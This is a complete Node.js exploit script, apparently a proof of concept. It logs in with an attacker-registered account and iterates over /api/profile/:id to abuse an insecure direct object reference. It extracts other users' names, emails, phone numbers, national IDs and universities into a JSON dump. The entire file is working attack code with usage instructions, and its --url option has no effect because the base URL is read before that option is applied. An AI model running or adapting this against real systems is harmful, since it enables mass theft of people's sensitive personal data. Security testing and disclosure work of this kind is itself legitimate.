#!/usr/bin/env node
/**
 * HCPC IDOR Extraction Script
 * Walks /api/profile/1 .. /api/profile/N and dumps results.
 * Demonstrates the missing ownership check on GET /api/profile/:id
 * 
 * Usage:
 *   node scripts/extract.js --email attacker@example.com --password secret123 --max 20
 *   node scripts/extract.js --email attacker@example.com --password secret123 --max 100 --out dump.json
 */

const BASE = process.env.HCPC_URL || 'http://localhost:5000';

function parseArgs() {
  const args = process.argv.slice(2);
  const o = { email: null, password: null, max: 20, out: null };
  for (let i = 0; i < args.length; i++) {
    if (args[i] === '--email') o.email = args[++i];
    if (args[i] === '--password') o.password = args[++i];
    if (args[i] === '--max') o.max = Number(args[++i]);
    if (args[i] === '--out') o.out = args[++i];
    if (args[i] === '--url') o.url = args[++i];
  }
  if (o.url) process.env.HCPC_URL = o.url;
  return o;
}

async function login(email, password) {
  const res = await fetch(`${BASE}/api/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  });
  if (!res.ok) {
    const j = await res.json().catch(() => ({}));
    throw new Error(`Login failed (${res.status}): ${j.error || res.statusText}`);
  }
  const cookie = res.headers.get('set-cookie');
  const j = await res.json();
  console.log(`[+] Logged in as ${email} -> user #${j.id}`);
  if (!cookie) console.log('[!] Warning: no set-cookie header, trying without explicit cookie forwarding');
  return cookie;
}

async function extract(cookie, max, outPath) {
  const results = [];
  console.log(`[+] Starting IDOR walk: 1..${max} at ${BASE}/api/profile/:id`);
  console.log(`[+] Vulnerable endpoint checks session exists but NOT ownership (session.userId !== :id)\n`);

  for (let id = 1; id <= max; id++) {
    const res = await fetch(`${BASE}/api/profile/${id}`, {
      headers: cookie ? { Cookie: cookie } : {}
    });
    const body = await res.json().catch(() => ({}));
    if (res.ok) {
      results.push(body);
      console.log(`  [${String(id).padStart(3)}] OK ${body.first_name} ${body.last_name} | ${body.email} | ${body.phone} | NID:${body.national_id} | ${body.university} | ${body.status}`);
    } else if (res.status === 404) {
      console.log(`  [${String(id).padStart(3)}] - not found`);
    } else if (res.status === 401) {
      console.log(`  [${String(id).padStart(3)}] FAIL 401 Unauthorized - session expired?`);
      break;
    } else {
      console.log(`  [${String(id).padStart(3)}] ? ${res.status} ${JSON.stringify(body)}`);
    }
  }

  console.log(`\n[+] Done. Extracted ${results.length} profiles.`);
  if (outPath) {
    const fs = require('fs');
    fs.writeFileSync(outPath, JSON.stringify(results, null, 2));
    console.log(`[+] Dumped to ${outPath}`);
  } else if (results.length) {
    console.log(`\n--- JSON DUMP ---\n${JSON.stringify(results, null, 2)}`);
  }
  return results;
}

(async () => {
  const { email, password, max, out } = parseArgs();
  if (!email || !password) {
    console.log(`
 HCPC IDOR Extractor

 Usage: node scripts/extract.js --email <attacker_email> --password <pass> [--max N] [--out file.json] [--url http://localhost:5000]

 Example:
   1) Register an attacker account at http://localhost:5000/register
   2) node scripts/extract.js --email attacker@test.com --password 123456 --max 20

 Env: HCPC_URL overrides base URL (default http://localhost:5000)
`);
    process.exit(1);
  }
  try {
    const cookie = await login(email, password);
    await extract(cookie, max, out);
  } catch (e) {
    console.error('[!] Error:', e.message);
    process.exit(1);
  }
})();
